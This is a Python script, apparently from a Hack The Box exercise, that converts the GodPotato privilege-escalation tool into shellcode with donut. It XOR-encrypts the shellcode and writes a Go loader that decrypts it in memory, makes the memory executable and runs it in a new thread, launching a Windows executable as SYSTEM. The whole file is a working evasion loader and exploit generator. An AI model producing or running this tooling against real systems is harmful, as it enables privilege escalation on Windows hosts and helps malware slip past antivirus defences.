#!/usr/bin/env python3
"""Generate Go XOR loader for GodPotato->s.exe (walkthrough method)."""
import secrets
from pathlib import Path

import donut

HERE = Path("/mnt/c/Users/tdgf/OneDrive/Bureau/CODE/Repo/HTB")
gp = HERE / "GodPotato.exe"
# Prefer NET4 binary
shellcode = donut.create(file=str(gp), params=r"-cmd C:\Users\Public\s.exe")
key = secrets.token_bytes(32)
encrypted = bytes([shellcode[i] ^ key[i % len(key)] for i in range(len(shellcode))])


def to_go_bytes(data, name):
    lines = [f"var {name} = []byte{{"]
    for i in range(0, len(data), 16):
        chunk = data[i : i + 16]
        lines.append("\t" + ", ".join(f"0x{b:02x}" for b in chunk) + ",")
    lines.append("}")
    return "\n".join(lines)


go_code = f"""package main
import (
\t"syscall"
\t"unsafe"
)
{to_go_bytes(key, "key")}
{to_go_bytes(encrypted, "enc")}
func main() {{
\tsc := make([]byte, len(enc))
\tfor i := range enc {{
\t\tsc[i] = enc[i] ^ key[i%len(key)]
\t}}
\tkernel32 := syscall.NewLazyDLL("kernel32.dll")
\tvAlloc := kernel32.NewProc("VirtualAlloc")
\taddr, _, _ := vAlloc.Call(0, uintptr(len(sc)), 0x3000, 0x04)
\tfor i, b := range sc {{
\t\t*(*byte)(unsafe.Pointer(addr + uintptr(i))) = b
\t}}
\tvar old uint32
\tvProt := kernel32.NewProc("VirtualProtect")
\tvProt.Call(addr, uintptr(len(sc)), 0x20, uintptr(unsafe.Pointer(&old)))
\tcreateThread := kernel32.NewProc("CreateThread")
\twaitForSingleObject := kernel32.NewProc("WaitForSingleObject")
\tthread, _, _ := createThread.Call(0, 0, addr, 0, 0, 0)
\twaitForSingleObject.Call(thread, 0xFFFFFFFF)
}}
"""
out = HERE / "loader.go"
out.write_text(go_code)
print(f"Generated {out} ({len(shellcode)} bytes shellcode)")
